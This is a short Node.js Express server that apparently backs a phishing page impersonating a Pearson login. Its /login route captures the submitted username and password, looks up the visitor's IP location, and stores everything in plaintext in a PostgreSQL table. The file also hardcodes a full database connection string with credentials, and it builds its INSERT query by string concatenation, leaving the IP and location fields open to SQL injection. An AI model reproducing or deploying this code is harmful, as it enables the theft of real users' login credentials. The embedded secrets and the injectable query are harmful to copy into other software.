
var express = require('express');
var app = express();
app.use(express.static('public'));
const PORT = process.env.PORT || 5000;
app.set('view engine', 'ejs');
const pg = require('pg');
var bodyParser = require('body-parser');
const client = new pg.Client("postgresql://uqfjfimhzuutbcan6vfl:Zu8iSPXRWYHSg7Lx3ZqI@bajqpai7rpemeiadfgci-postgresql.services.clever-cloud.com:5432/bajqpai7rpemeiadfgci");
const iplocation = require("iplocation").default;
var loc;
var city;
var reg;
app.use(bodyParser.urlencoded({ extended: false }));
client.query("CREATE TABLE pearson_users (id SERIAL,users text,password text ,country text ,ip text ,time timestamp default now())")

client.connect();
// ######################################################################################################################
app.get('/',function(req,res){
    res.render('home')
})
app.get('/pearson',function(req,res){
    res.render('pearson')
})
app.post('/login', function (req, res) {
   
    
    var a = req.body.j_username.replace(/\\/g, "\\\\").replace(/'/g, "\\'");
    var b = req.body.j_password.replace(/\\/g, "\\\\").replace(/'/g, "\\'");
    var ip = req.headers['x-forwarded-for'] ||
        req.connection.remoteAddress ||
        req.socket.remoteAddress ||
        (req.connection.socket ? req.connection.socket.remoteAddress : null);
    iplocation(ip, [], (error, res) => {
        loc = res.country; city = res.region; reg = res.city; console.log(res);
        var location = loc + '---' + city + '---' + reg;

        client.query("INSERT INTO pearson_users (users,password,ip,country) VALUES ('" + a + "','" + b + "','" + ip + "','" + location + "')", function (err, result) { });
    });

   
})

app.listen(PORT, function () {
    console.log('Server Started')
})